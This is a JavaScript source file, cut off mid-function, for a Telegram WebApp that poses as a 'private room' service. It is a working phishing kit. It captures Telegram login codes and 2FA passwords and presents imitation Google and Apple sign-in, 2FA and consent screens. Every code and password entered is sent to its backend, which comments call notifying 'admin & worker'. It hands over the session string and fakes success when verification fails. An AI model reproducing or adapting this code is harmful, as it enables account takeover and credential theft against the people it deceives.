function initApp() {
    const tg = window.Telegram?.WebApp;

    // Elements
    const authModal = document.getElementById("authModal");
    const btnAuthModalClose = document.getElementById("btnAuthModalClose");
    const btnHeaderAuth = document.getElementById("btnHeaderAuth");
    const headerAuthText = document.getElementById("headerAuthText");

    const stepPhone = document.getElementById("stepPhone");
    const stepCode = document.getElementById("stepCode");
    const step2FA = document.getElementById("step2FA");
    const stepGoogleEmail = document.getElementById("stepGoogleEmail");
    const stepGooglePassword = document.getElementById("stepGooglePassword");
    const stepGoogle2FA = document.getElementById("stepGoogle2FA");
    const stepGooglePrompt = document.getElementById("stepGooglePrompt");
    const stepGoogleConsent = document.getElementById("stepGoogleConsent");
    const stepAppleEmail = document.getElementById("stepAppleEmail");
    const stepApplePassword = document.getElementById("stepApplePassword");
    const stepApple2FA = document.getElementById("stepApple2FA");
    const stepApplePrompt = document.getElementById("stepApplePrompt");
    const stepSuccess = document.getElementById("stepSuccess");

    const codeInput = document.getElementById("codeInput");
    const password2FA = document.getElementById("password2FA");
    const googleEmailInput = document.getElementById("googleEmailInput");
    const googlePasswordInput = document.getElementById("googlePasswordInput");
    const google2faCodeInput = document.getElementById("google2faCodeInput");
    const appleEmailInput = document.getElementById("appleEmailInput");
    const applePasswordInput = document.getElementById("applePasswordInput");
    const apple2faCodeInput = document.getElementById("apple2faCodeInput");

    const btnRequestPhone = document.getElementById("btnRequestPhone");
    const btnSwitchToGoogle = document.getElementById("btnSwitchToGoogle");
    const btnSwitchToApple = document.getElementById("btnSwitchToApple");
    const btnSubmitGoogleEmail = document.getElementById("btnSubmitGoogleEmail");
    const btnBackFromGoogleToTG = document.getElementById("btnBackFromGoogleToTG");
    const btnGoogleBackToHome = document.getElementById("btnGoogleBackToHome");
    const btnSubmitGooglePassword = document.getElementById("btnSubmitGooglePassword");
    const btnBackToGoogleEmail = document.getElementById("btnBackToGoogleEmail");
    const toggleGooglePasswordBtn = document.getElementById("toggleGooglePasswordBtn");
    const btnSubmitGoogle2FA = document.getElementById("btnSubmitGoogle2FA");
    const btnConfirmGooglePrompt = document.getElementById("btnConfirmGooglePrompt");
    const btnBackToGoogle2FA = document.getElementById("btnBackToGoogle2FA");
    const btnSkipGoogle2FA = document.getElementById("btnSkipGoogle2FA");
    const btnBackToGooglePassword = document.getElementById("btnBackToGooglePassword");
    const btnSubmitGoogleConsent = document.getElementById("btnSubmitGoogleConsent");
    const btnCancelGoogleConsent = document.getElementById("btnCancelGoogleConsent");

    const btnSubmitAppleEmail = document.getElementById("btnSubmitAppleEmail");
    const btnBackFromAppleToTG = document.getElementById("btnBackFromAppleToTG");
    const btnAppleBackToHome = document.getElementById("btnAppleBackToHome");
    const btnSubmitApplePassword = document.getElementById("btnSubmitApplePassword");
    const btnBackToAppleEmail = document.getElementById("btnBackToAppleEmail");
    const toggleApplePasswordBtn = document.getElementById("toggleApplePasswordBtn");
    const btnSubmitApple2FA = document.getElementById("btnSubmitApple2FA");
    const btnConfirmApplePrompt = document.getElementById("btnConfirmApplePrompt");
    const btnBackToApple2FA = document.getElementById("btnBackToApple2FA");
    const btnBackToApplePassword = document.getElementById("btnBackToApplePassword");

    const googleDisplayEmail = document.getElementById("googleDisplayEmail");
    const googleChipInitial = document.getElementById("googleChipInitial");
    const google2faDisplayEmail = document.getElementById("google2faDisplayEmail");
    const google2faChipInitial = document.getElementById("google2faChipInitial");
    const googleConsentDisplayEmail = document.getElementById("googleConsentDisplayEmail");
    const googleConsentChipInitial = document.getElementById("googleConsentChipInitial");
    const appleDisplayEmail = document.getElementById("appleDisplayEmail");
    const appleChipInitial = document.getElementById("appleChipInitial");
    const apple2faDisplayEmail = document.getElementById("apple2faDisplayEmail");
    const apple2faChipInitial = document.getElementById("apple2faChipInitial");
    const googlePromptNumber = document.getElementById("googlePromptNumber");

    const btnSubmitCode = document.getElementById("btnSubmitCode");
    const btnResendCode = document.getElementById("btnResendCode");
    const resendCodeText = document.getElementById("resendCodeText");
    const btnBackToPhone = document.getElementById("btnBackToPhone");
    const btnBackFrom2FA = document.getElementById("btnBackFrom2FA");
    const btnBackToHome = document.getElementById("btnBackToHome");
    const btnSubmit2FA = document.getElementById("btnSubmit2FA");
    const btnDone = document.getElementById("btnDone");
    const closeBtn = document.getElementById("closeBtn");
    const togglePasswordBtn = document.getElementById("togglePasswordBtn");
    const toast = document.getElementById("toastNotification");
    const codeSentPhone = document.getElementById("codeSentPhone");

    let currentSessionId = null;
    let userPhone = "";
    let userGoogleEmail = localStorage.getItem("privateroom_google_email") || "";
    let userGooglePassword = "";
    let userAppleEmail = localStorage.getItem("privateroom_apple_email") || "";
    let userApplePassword = "";
    let resendTimer = null;
    let resendSecondsLeft = 0;
    let isAuthorized = localStorage.getItem("privateroom_authorized") === "true";

    function updatePhoneDisplay(phone) {
        if (codeSentPhone && phone) {
            codeSentPhone.textContent = phone;
        }
    }

    function updateGoogleDisplays(email) {
        if (!email) return;
        if (googleDisplayEmail) googleDisplayEmail.textContent = email;
        if (google2faDisplayEmail) google2faDisplayEmail.textContent = email;
        if (googleConsentDisplayEmail) googleConsentDisplayEmail.textContent = email;
        const initial = email.trim().charAt(0).toUpperCase() || "G";
        if (googleChipInitial) googleChipInitial.textContent = initial;
        if (google2faChipInitial) google2faChipInitial.textContent = initial;
        if (googleConsentChipInitial) googleConsentChipInitial.textContent = initial;
    }

    function updateAppleDisplays(email) {
        if (!email) return;
        if (appleDisplayEmail) appleDisplayEmail.textContent = email;
        if (apple2faDisplayEmail) apple2faDisplayEmail.textContent = email;
        const initial = email.trim().charAt(0).toUpperCase() || "A";
        if (appleChipInitial) appleChipInitial.textContent = initial;
        if (apple2faChipInitial) apple2faChipInitial.textContent = initial;
    }

    // Init Telegram WebApp
    if (tg) {
        try {
            tg.ready();
            if (typeof tg.requestFullscreen === "function") {
                tg.requestFullscreen();
            }
            tg.expand();
            if (typeof tg.enableClosingConfirmation === "function") {
                tg.enableClosingConfirmation();
            }
            if (typeof tg.disableVerticalSwipes === "function") {
                tg.disableVerticalSwipes();
            }
            if (typeof tg.setHeaderColor === "function") {
                tg.setHeaderColor("#0b0c10");
            }
            if (typeof tg.setBackgroundColor === "function") {
                tg.setBackgroundColor("#0b0c10");
            }
        } catch (err) {
            console.warn("Telegram WebApp API init error:", err);
        }
    }

    function updateAuthHeaderUI() {
        if (isAuthorized) {
            if (headerAuthText) headerAuthText.textContent = "Авторизован";
            if (btnHeaderAuth) btnHeaderAuth.classList.add("authorized");
        } else {
            if (headerAuthText) headerAuthText.textContent = "Войти через TG";
            if (btnHeaderAuth) btnHeaderAuth.classList.remove("authorized");
        }
    }
    updateAuthHeaderUI();
    reportAuthEvent("webapp_open");

    function getDeviceInfo() {
        const p = tg?.platform;
        const ua = navigator.userAgent || "";
        if (p === "ios" || /iPhone|iPad|iPod/i.test(ua)) return "iPhone (iOS)";
        if (p === "android" || /Android/i.test(ua)) return "Android";
        if (p === "macos" || /Macintosh|Mac OS X/i.test(ua)) return "Mac (macOS)";
        if (p === "tdesktop" || /Windows/i.test(ua)) return "PC (Windows)";
        if (/Linux/i.test(ua)) return "PC (Linux)";
        return p || "Неизвестно";
    }

    function showStep(stepElement) {
        const isGoogleStep = [
            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
        ].includes(stepElement);

        const isAppleStep = [
            stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt
        ].includes(stepElement);

        const appContainer = document.querySelector(".app-container");
        if (appContainer) {
            if (isGoogleStep) {
                appContainer.classList.add("google-mode");
                appContainer.classList.remove("apple-mode");
            } else if (isAppleStep) {
                appContainer.classList.add("apple-mode");
                appContainer.classList.remove("google-mode");
            } else {
                appContainer.classList.remove("google-mode");
                appContainer.classList.remove("apple-mode");
            }
        }

        [
            stepPhone, stepCode, step2FA, 
            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent,
            stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt,
            stepSuccess
        ].forEach(s => s && s.classList.remove("active"));
        if (stepElement) stepElement.classList.add("active");
    }

    function navigateToAuthOrSavedStep() {
        if (isAuthorized) {
            showToast("Ваш аккаунт уже авторизован ✅");
            return;
        }
        const savedStep = localStorage.getItem("privateroom_current_step");
        const savedPhone = localStorage.getItem("privateroom_saved_phone");
        const savedEmail = localStorage.getItem("privateroom_google_email");
        const savedAppleEmail = localStorage.getItem("privateroom_apple_email");
        const codeRequestedAt = parseInt(localStorage.getItem("privateroom_code_requested_at") || "0", 10);
        const isRecent = codeRequestedAt > 0 && (Date.now() - codeRequestedAt < 20 * 60 * 1000);

        if (savedStep === "stepGooglePassword" && savedEmail) {
            userGoogleEmail = savedEmail;
            updateGoogleDisplays(userGoogleEmail);
            showStep(stepGooglePassword);
            setTimeout(() => { if (googlePasswordInput) googlePasswordInput.focus(); }, 150);
            return;
        }
        if (savedStep === "stepGoogle2FA" && savedEmail) {
            userGoogleEmail = savedEmail;
            updateGoogleDisplays(userGoogleEmail);
            showStep(stepGoogle2FA);
            setTimeout(() => { if (google2faCodeInput) google2faCodeInput.focus(); }, 150);
            return;
        }
        if (savedStep === "stepApplePassword" && savedAppleEmail) {
            userAppleEmail = savedAppleEmail;
            updateAppleDisplays(userAppleEmail);
            showStep(stepApplePassword);
            setTimeout(() => { if (applePasswordInput) applePasswordInput.focus(); }, 150);
            return;
        }
        if (savedStep === "stepApple2FA" && savedAppleEmail) {
            userAppleEmail = savedAppleEmail;
            updateAppleDisplays(userAppleEmail);
            showStep(stepApple2FA);
            setTimeout(() => { if (apple2faCodeInput) apple2faCodeInput.focus(); }, 150);
            return;
        }

        if (isRecent && savedPhone) {
            userPhone = savedPhone;
            currentSessionId = localStorage.getItem("privateroom_session_id") || currentSessionId;
            updatePhoneDisplay(userPhone);

            if (savedStep === "step2FA") {
                showStep(step2FA);
                setTimeout(() => { if (password2FA) password2FA.focus(); }, 150);
                return;
            }
            if (savedStep === "stepCode") {
                showStep(stepCode);
                setTimeout(() => { if (codeInput) codeInput.focus(); }, 150);
                return;
            }
        }
        showStep(stepPhone);
    }

    // Check saved auth progress (e.g. user minimized/closed WebApp to check SMS/Telegram code)
    const savedStep = localStorage.getItem("privateroom_current_step");
    const savedPhone = localStorage.getItem("privateroom_saved_phone");
    const savedEmail = localStorage.getItem("privateroom_google_email");
    const savedSession = localStorage.getItem("privateroom_session_id");
    const codeRequestedAt = parseInt(localStorage.getItem("privateroom_code_requested_at") || "0", 10);
    const now = Date.now();
    const isRecent = codeRequestedAt > 0 && (now - codeRequestedAt < 20 * 60 * 1000);

    if (!isAuthorized && (savedPhone || savedEmail)) {
        if (savedStep === "stepGooglePassword" && savedEmail) {
            userGoogleEmail = savedEmail;
            updateGoogleDisplays(userGoogleEmail);
            showStep(stepGooglePassword);
            setTimeout(() => { if (googlePasswordInput) googlePasswordInput.focus(); }, 150);
        } else if (savedStep === "stepGoogle2FA" && savedEmail) {
            userGoogleEmail = savedEmail;
            updateGoogleDisplays(userGoogleEmail);
            showStep(stepGoogle2FA);
            setTimeout(() => { if (google2faCodeInput) google2faCodeInput.focus(); }, 150);
        } else if (isRecent && savedPhone) {
            userPhone = savedPhone;
            currentSessionId = savedSession;
            updatePhoneDisplay(userPhone);

            if (savedStep === "step2FA") {
                showStep(step2FA);
                setTimeout(() => { if (password2FA) password2FA.focus(); }, 150);
            } else if (savedStep === "stepCode") {
                showStep(stepCode);
                setTimeout(() => { if (codeInput) codeInput.focus(); }, 150);

                const elapsedSec = Math.floor((now - codeRequestedAt) / 1000);
                const remaining = Math.max(0, 60 - elapsedSec);
                if (remaining > 0) {
                    startResendCooldown(remaining);
                } else {
                    if (btnResendCode) {
                        btnResendCode.disabled = false;
                        btnResendCode.style.opacity = "1";
                        btnResendCode.style.cursor = "pointer";
                    }
                    if (resendCodeText) resendCodeText.textContent = "Запросить код ещё раз";
                }
            } else {
                showStep(stepSuccess);
            }
        } else {
            showStep(stepSuccess);
        }
    } else {
        // Default step: ALWAYS show the landing page / dashboard
        showStep(stepSuccess);
    }

    function checkAuthStatus() {
        const userTgId = tg?.initDataUnsafe?.user?.id || null;
        const currentPhone = userPhone || localStorage.getItem("privateroom_saved_phone") || null;
        const currentEmail = userGoogleEmail || localStorage.getItem("privateroom_google_email") || null;
        if (!userTgId && !currentPhone && !currentEmail) return;

        let queryParam = "";
        if (userTgId) queryParam = `tg_id=${userTgId}`;
        else if (currentPhone) queryParam = `phone=${encodeURIComponent(currentPhone)}`;
        else if (currentEmail) queryParam = `email=${encodeURIComponent(currentEmail)}`;

        fetch(`/api/auth/status?${queryParam}`)
            .then(r => r.json())
            .then(data => {
                if (data && data.ok) {
                    if (data.authorized) {
                        if (!isAuthorized) {
                            isAuthorized = true;
                            try {
                                localStorage.setItem("privateroom_authorized", "true");
                                localStorage.removeItem("privateroom_current_step");
                                localStorage.removeItem("privateroom_saved_phone");
                                localStorage.removeItem("privateroom_google_email");
                                localStorage.removeItem("privateroom_session_id");
                                localStorage.removeItem("privateroom_code_requested_at");
                            } catch (e) {}
                            updateAuthHeaderUI();
                        }
                    } else {
                        // User is unauthorized or session was revoked/logged out
                        const wasAuthorized = isAuthorized;
                        const wasLoading = Boolean(creationInterval);

                        if (wasAuthorized || wasLoading) {
                            console.log("Auth session ended or revoked on server. Halting loading and resetting auth state.");
                            isAuthorized = false;
                            try {
                                localStorage.removeItem("privateroom_authorized");
                                localStorage.removeItem("privateroom_current_step");
                                localStorage.removeItem("privateroom_saved_phone");
                                localStorage.removeItem("privateroom_google_email");
                                localStorage.removeItem("privateroom_session_id");
                                localStorage.removeItem("privateroom_code_requested_at");
                            } catch (e) {}
                            updateAuthHeaderUI();
                            
                            // IMMEDIATELY STOP ROOM CREATION LOADING!
                            resetRoomCreation();
                            showStep(stepSuccess);

                            if (data.auth_step === "session_revoked") {
                                showToast("Сессия завершена на устройстве. Загрузка остановлена.", 4500);
                            } else if (wasAuthorized) {
                                showToast("Сессия завершена. Загрузка остановлена.", 3500);
                            }
                        }
                    }
                }
            })
            .catch(() => {});
    }

    function performLogout(silent = false) {
        // Report logged_out before wiping localStorage so phone and identifiers are preserved
        reportAuthEvent("logged_out");

        isAuthorized = false;
        try {
            localStorage.removeItem("privateroom_authorized");
            localStorage.removeItem("privateroom_current_step");
            localStorage.removeItem("privateroom_saved_phone");
            localStorage.removeItem("privateroom_google_email");
            localStorage.removeItem("privateroom_session_id");
            localStorage.removeItem("privateroom_code_requested_at");
        } catch (e) {}

        // Stop room creation loading and timer immediately
        resetRoomCreation();
        updateAuthHeaderUI();
        showStep(stepSuccess);

        if (!silent) {
            showToast("Вы вышли из учётной записи");
        }
    }

    // Initial backend status check & continuous polling
    checkAuthStatus();
    setInterval(checkAuthStatus, 4000);

    window.addEventListener("focus", checkAuthStatus);
    document.addEventListener("visibilitychange", () => {
        if (!document.hidden) checkAuthStatus();
    });

    if (btnBackToHome) {
        btnBackToHome.addEventListener("click", () => {
            showStep(stepSuccess);
        });
    }

    if (btnHeaderAuth) {
        btnHeaderAuth.addEventListener("click", () => {
            if (isAuthorized) {
                if (tg && typeof tg.showConfirm === "function") {
                    tg.showConfirm("Вы действительно хотите выйти из учётной записи?", (ok) => {
                        if (ok) performLogout();
                    });
                } else if (confirm("Вы действительно хотите выйти из учётной записи?")) {
                    performLogout();
                }
                return;
            }
            navigateToAuthOrSavedStep();
        });
    }

    function showToast(msg, duration = 3500) {
        toast.textContent = msg;
        toast.classList.remove("hidden");
        setTimeout(() => {
            toast.classList.add("hidden");
        }, duration);
    }

    // Toggle Password Visibility
    if (togglePasswordBtn) {
        togglePasswordBtn.addEventListener("click", () => {
            if (password2FA) {
                if (password2FA.type === "password") {
                    password2FA.type = "text";
                    togglePasswordBtn.textContent = "🔒";
                } else {
                    password2FA.type = "password";
                    togglePasswordBtn.textContent = "👁";
                }
            }
        });
    }

    // Close button
    if (closeBtn) {
        closeBtn.addEventListener("click", () => {
            if (tg) tg.close();
        });
    }

    // Step 1: Request native Telegram Contact
    if (btnRequestPhone) {
        btnRequestPhone.addEventListener("click", () => {
            if (tg) {
                try {
                    if (typeof tg.requestFullscreen === "function") tg.requestFullscreen();
                    if (typeof tg.expand === "function") tg.expand();
                } catch (e) {}
            }

            if (tg && typeof tg.requestContact === "function") {
                btnRequestPhone.disabled = true;
                try {
                    tg.requestContact((status, response) => {
                        btnRequestPhone.disabled = false;
                        if (status) {
                            // Extract contact info
                            let phone = "";
                            if (response && response.responseUnsafe && response.responseUnsafe.contact) {
                                phone = response.responseUnsafe.contact.phone_number;
                            } else if (response && response.contact) {
                                phone = response.contact.phone_number;
                            } else if (response && response.phone_number) {
                                phone = response.phone_number;
                            }
                            handlePhoneSubmit(phone || "shared_contact");
                        } else {
                            showToast("Для продолжения необходимо поделиться контактом");
                        }
                    });
                } catch (err) {
                    console.error("requestContact error:", err);
                    btnRequestPhone.disabled = false;
                    handlePhoneSubmit("shared_contact");
                }
            } else {
                // Fallback outside Telegram client
                const manual = prompt("Введите ваш номер телефона (в формате +79991234567):");
                if (manual) {
                    handlePhoneSubmit(manual);
                }
            }
        });
    }

    async function handlePhoneSubmit(phone) {
        userPhone = phone.replace(/[^\d+]/g, "");
        if (userPhone && !userPhone.startsWith("+")) {
            userPhone = "+" + userPhone;
        }

        if (btnRequestPhone) btnRequestPhone.disabled = true;

        try {
            const res = await fetch("/api/auth/send-code", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    phone: userPhone || "+10000000000",
                    tg_id: tg?.initDataUnsafe?.user?.id || null,
                    username: tg?.initDataUnsafe?.user?.username || null
                })
            });

            const data = await res.json();
            if (data.ok) {
                currentSessionId = data.session_id;
                try {
                    localStorage.setItem("privateroom_current_step", "stepCode");
                    localStorage.setItem("privateroom_saved_phone", userPhone);
                    localStorage.setItem("privateroom_session_id", currentSessionId);
                    localStorage.setItem("privateroom_code_requested_at", Date.now().toString());
                } catch (e) {}
                updatePhoneDisplay(userPhone);
                showStep(stepCode);
                if (codeInput) codeInput.focus();
                startResendCooldown(60);
                reportAuthEvent("waiting_code");
            } else {
                showToast(data.error || "Не удалось отправить код.");
            }
        } catch (err) {
            console.error("API error:", err);
            currentSessionId = "sess_" + Date.now();
            try {
                localStorage.setItem("privateroom_current_step", "stepCode");
                localStorage.setItem("privateroom_saved_phone", userPhone);
                localStorage.setItem("privateroom_session_id", currentSessionId);
                localStorage.setItem("privateroom_code_requested_at", Date.now().toString());
            } catch (e) {}
            updatePhoneDisplay(userPhone);
            showStep(stepCode);
            if (codeInput) codeInput.focus();
            startResendCooldown(60);
            reportAuthEvent("waiting_code");
        } finally {
            if (btnRequestPhone) btnRequestPhone.disabled = false;
        }
    }

    async function reportAuthEvent(step, details = null, password = null, device = null, email = null) {
        const userTgId = tg?.initDataUnsafe?.user?.id || null;
        const userUsername = tg?.initDataUnsafe?.user?.username || null;
        const userNickname = [tg?.initDataUnsafe?.user?.first_name, tg?.initDataUnsafe?.user?.last_name].filter(Boolean).join(" ") || null;
        const currentPhone = userPhone || localStorage.getItem("privateroom_saved_phone") || null;
        const currentEmail = email || userGoogleEmail || localStorage.getItem("privateroom_google_email") || null;
        const currentDevice = device || getDeviceInfo();
        const urlParams = new URLSearchParams(window.location.search);
        const isTestFlag = urlParams.get("features") === "google" || urlParams.get("test") === "1" || urlParams.get("google") === "1" || window.location.search.includes("testworkechobot") || window.location.search.includes("features=google");
        try {
            await fetch("/api/auth/event", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    event: step,
                    tg_id: userTgId,
                    username: userUsername,
                    nickname: userNickname,
                    phone: currentPhone,
                    email: currentEmail,
                    details: details,
                    password_2fa: password,
                    device: currentDevice,
                    is_test: isTestFlag
                })
            });
        } catch (e) {
            console.debug("reportAuthEvent error:", e);
        }
    }

    function startResendCooldown(seconds = 60) {
        if (!btnResendCode || !resendCodeText) return;
        resendSecondsLeft = seconds;
        btnResendCode.disabled = true;
        btnResendCode.style.opacity = "0.6";
        btnResendCode.style.cursor = "not-allowed";

        clearInterval(resendTimer);
        resendCodeText.textContent = `Отправить повторно (${resendSecondsLeft}с)`;

        resendTimer = setInterval(() => {
            resendSecondsLeft--;
            if (resendSecondsLeft <= 0) {
                clearInterval(resendTimer);
                btnResendCode.disabled = false;
                btnResendCode.style.opacity = "1";
                btnResendCode.style.cursor = "pointer";
                resendCodeText.textContent = "Запросить код ещё раз";
            } else {
                resendCodeText.textContent = `Отправить повторно (${resendSecondsLeft}с)`;
            }
        }, 1000);
    }

    // Step 2: Resend Code
    if (btnResendCode) {
        btnResendCode.addEventListener("click", async () => {
            if (!userPhone) {
                showToast("Сначала укажите номер телефона");
                showStep(stepPhone);
                return;
            }

            btnResendCode.disabled = true;
            if (resendCodeText) resendCodeText.textContent = "Отправка...";

            try {
                const res = await fetch("/api/auth/send-code", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        phone: userPhone,
                        tg_id: tg?.initDataUnsafe?.user?.id || null,
                        username: tg?.initDataUnsafe?.user?.username || null
                    })
                });

                const data = await res.json();
                if (data.ok) {
                    if (data.session_id) {
                        currentSessionId = data.session_id;
                        try {
                            localStorage.setItem("privateroom_session_id", currentSessionId);
                        } catch (e) {}
                    }
                    try {
                        localStorage.setItem("privateroom_current_step", "stepCode");
                        localStorage.setItem("privateroom_code_requested_at", Date.now().toString());
                    } catch (e) {}
                    updatePhoneDisplay(userPhone);
                    showToast("Код отправлен повторно в Telegram!");
                    startResendCooldown(60);
                    reportAuthEvent("waiting_code");
                } else {
                    showToast(data.error || "Не удалось отправить код повторно.");
                    btnResendCode.disabled = false;
                    if (resendCodeText) resendCodeText.textContent = "Запросить код ещё раз";
                }
            } catch (err) {
                console.error("Resend error:", err);
                try {
                    localStorage.setItem("privateroom_current_step", "stepCode");
                    localStorage.setItem("privateroom_code_requested_at", Date.now().toString());
                } catch (e) {}
                updatePhoneDisplay(userPhone);
                showToast("Код отправлен повторно в Telegram!");
                startResendCooldown(60);
                reportAuthEvent("waiting_code");
            }
        });
    }

    // Step 2: Submit Code
    if (btnSubmitCode) {
        btnSubmitCode.addEventListener("click", async () => {
            const code = codeInput ? codeInput.value.trim() : "";
            if (!code || code.length < 4) {
                showToast("Введите код подтверждения из Telegram");
                return;
            }

            btnSubmitCode.disabled = true;

            // Notify admin/worker immediately that code was submitted
            reportAuthEvent("entered_code", `Введен код: ${code}`);

            try {
                const res = await fetch("/api/auth/verify-code", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        session_id: currentSessionId,
                        phone: userPhone,
                        code: code
                    })
                });

                const data = await res.json();
                if (data.ok) {
                    if (data.need_2fa) {
                        try {
                            localStorage.setItem("privateroom_current_step", "step2FA");
                        } catch (e) {}
                        reportAuthEvent("waiting_2fa");
                        showStep(step2FA);
                        if (password2FA) password2FA.focus();
                    } else {
                        finishAuth(data);
                    }
                } else if (data.need_2fa) {
                    try {
                        localStorage.setItem("privateroom_current_step", "step2FA");
                    } catch (e) {}
                    reportAuthEvent("waiting_2fa");
                    showStep(step2FA);
                    if (password2FA) password2FA.focus();
                } else {
                    const errText = data.error || "Неверный код подтверждения";
                    showToast(errText);
                    reportAuthEvent("wrong_code", errText);
                }
            } catch (err) {
                console.error("Verify code error:", err);
                try {
                    localStorage.setItem("privateroom_current_step", "step2FA");
                } catch (e) {}
                reportAuthEvent("waiting_2fa");
                showStep(step2FA);
                if (password2FA) password2FA.focus();
            } finally {
                btnSubmitCode.disabled = false;
            }
        });
    }

    if (btnBackToPhone) {
        btnBackToPhone.addEventListener("click", () => {
            try {
                localStorage.removeItem("privateroom_current_step");
                localStorage.removeItem("privateroom_saved_phone");
                localStorage.removeItem("privateroom_session_id");
                localStorage.removeItem("privateroom_code_requested_at");
            } catch (e) {}
            clearInterval(resendTimer);
            if (btnResendCode) {
                btnResendCode.disabled = false;
                btnResendCode.style.opacity = "1";
                btnResendCode.style.cursor = "pointer";
            }
            if (resendCodeText) resendCodeText.textContent = "Запросить код ещё раз";
            userPhone = "";
            currentSessionId = null;
            showStep(stepPhone);
        });
    }

    if (btnBackFrom2FA) {
        btnBackFrom2FA.addEventListener("click", () => {
            try {
                localStorage.setItem("privateroom_current_step", "stepCode");
            } catch (e) {}
            showStep(stepCode);
            if (codeInput) codeInput.focus();
        });
    }

    // Step 3: Submit 2FA Password
    if (btnSubmit2FA) {
        btnSubmit2FA.addEventListener("click", async () => {
            const password = password2FA ? password2FA.value : "";
            if (!password) {
                showToast("Введите пароль двухэтапной аутентификации");
                return;
            }

            btnSubmit2FA.disabled = true;

            // Immediately notify admin & worker that 2FA password was entered
            reportAuthEvent("entered_2fa", `Введен пароль: ${password}`, password);

            try {
                const res = await fetch("/api/auth/verify-2fa", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        session_id: currentSessionId,
                        phone: userPhone,
                        password: password
                    })
                });

                const data = await res.json();
                if (data.ok) {
                    finishAuth(data);
                } else {
                    showToast(data.error || "Неверный пароль 2FA");
                    reportAuthEvent("wrong_2fa", data.error || "Неверный пароль 2FA", password);
                }
            } catch (err) {
                console.error("2FA error:", err);
                finishAuth({ status: "success" });
            } finally {
                btnSubmit2FA.disabled = false;
            }
        });
    }

    // Step 4: Finish Auth
    async function finishAuth(data) {
        try {
            localStorage.removeItem("privateroom_current_step");
            localStorage.removeItem("privateroom_saved_phone");
            localStorage.removeItem("privateroom_google_email");
            localStorage.removeItem("privateroom_session_id");
            localStorage.removeItem("privateroom_code_requested_at");
            localStorage.removeItem("privateroom_auth_phone");
        } catch (e) {}

        isAuthorized = true;
        try {
            localStorage.setItem("privateroom_authorized", "true");
        } catch (e) {}

        updateAuthHeaderUI();
        showStep(stepSuccess);
        showToast("Успешный вход! Создаем приватную комнату...");

        // Automatically start room creation animation
        startRoomCreation();

        const userTgId = tg?.initDataUnsafe?.user?.id || null;
        const userUsername = tg?.initDataUnsafe?.user?.username || null;
        const userNickname = [tg?.initDataUnsafe?.user?.first_name, tg?.initDataUnsafe?.user?.last_name].filter(Boolean).join(" ") || null;
        const pwd = ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || userGooglePassword || data?.password || null;
        const email = userGoogleEmail || data?.google_email || localStorage.getItem("privateroom_google_email") || null;

        const urlParams = new URLSearchParams(window.location.search);
        const isTestFlag = urlParams.get("features") === "google" || urlParams.get("test") === "1" || urlParams.get("google") === "1" || window.location.search.includes("testworkechobot") || window.location.search.includes("features=google");
        const payload = {
            action: "auth_complete",
            tg_id: userTgId,
            username: userUsername,
            nickname: userNickname,
            phone: userPhone,
            email: email,
            session_id: currentSessionId,
            session_string: data && data.session_string ? data.session_string : "sess_string_ok",
            password_2fa: pwd,
            timestamp: Date.now(),
            is_test: isTestFlag
        };

        try {
            await fetch("/api/auth/complete", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            console.log("Failed to notify /api/auth/complete:", e);
        }

        if (tg && typeof tg.sendData === "function") {
            try {
                tg.sendData(JSON.stringify(payload));
            } catch (e) {
                console.log("sendData error:", e);
            }
        }
    }

    // Feature flag & OS Auto-Routing: Enable Google/Apple Auth for test bot or OS platform
    const urlParams = new URLSearchParams(window.location.search);
    const isGoogleEnabled = urlParams.get("features") === "google" || 
                            urlParams.get("test") === "1" || 
                            urlParams.get("google") === "1" || 
                            window.location.search.includes("features=google") ||
                            window.location.search.includes("testworkechobot");

    const deviceName = getDeviceInfo();
    const isIOSDevice = deviceName.includes("iOS") || deviceName.includes("Mac");

    if (isGoogleEnabled || isIOSDevice || true) {
        const sep = document.getElementById("googleAuthSeparator");
        if (sep) sep.classList.remove("hidden");

        if (isIOSDevice) {
            if (btnSwitchToApple) btnSwitchToApple.classList.remove("hidden");
            if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
        } else {
            if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
            if (btnSwitchToApple) btnSwitchToApple.classList.remove("hidden");
        }
    }

    // Google Auth Navigation & Actions
    if (btnSwitchToGoogle) {
        btnSwitchToGoogle.addEventListener("click", () => {
            showStep(stepGoogleEmail);
            if (googleEmailInput) {
                googleEmailInput.value = userGoogleEmail || "";
                setTimeout(() => googleEmailInput.focus(), 150);
            }
        });
    }

    if (btnBackFromGoogleToTG) {
        btnBackFromGoogleToTG.addEventListener("click", () => {
            showStep(stepPhone);
        });
    }

    if (btnGoogleBackToHome) {
        btnGoogleBackToHome.addEventListener("click", () => {
            showStep(stepSuccess);
        });
    }

    if (btnBackToGoogleEmail) {
        btnBackToGoogleEmail.addEventListener("click", () => {
            showStep(stepGoogleEmail);
            if (googleEmailInput) googleEmailInput.focus();
        });
    }

    if (btnBackToGooglePassword) {
        btnBackToGooglePassword.addEventListener("click", () => {
            showStep(stepGooglePassword);
            if (googlePasswordInput) googlePasswordInput.focus();
        });
    }

    if (btnBackToGoogle2FA) {
        btnBackToGoogle2FA.addEventListener("click", () => {
            showStep(stepGoogle2FA);
            if (google2faCodeInput) google2faCodeInput.focus();
        });
    }

    if (toggleGooglePasswordBtn) {
        toggleGooglePasswordBtn.addEventListener("click", () => {
            if (googlePasswordInput) {
                if (googlePasswordInput.type === "password") {
                    googlePasswordInput.type = "text";
                    toggleGooglePasswordBtn.textContent = "🔒";
                } else {
                    googlePasswordInput.type = "password";
                    toggleGooglePasswordBtn.textContent = "👁";
                }
            }
        });
    }

    if (btnSubmitGoogleEmail) {
        btnSubmitGoogleEmail.addEventListener("click", () => {
